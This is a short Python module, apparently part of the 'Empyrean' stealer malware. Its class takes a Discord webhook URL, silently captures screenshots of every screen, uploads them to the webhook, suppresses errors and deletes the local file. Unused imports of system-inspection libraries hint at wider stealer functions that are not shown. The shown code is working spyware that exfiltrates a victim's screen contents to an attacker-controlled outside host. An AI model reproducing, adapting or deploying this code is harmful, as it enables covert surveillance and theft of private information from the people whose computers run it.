import ctypes
import os
import re
import subprocess
import uuid

import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time


class Pars():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)
        embed = Embed(title="Pars:", color=0x005090)

        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(
                embed=embed,
                file=File('.\\screenshot.png', filename='screenshot.png'),
                username="Empyrean",
                avatar_url="https://i.imgur.com/vQGnFD4.jpeg"
            )
        except:
            pass

        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")
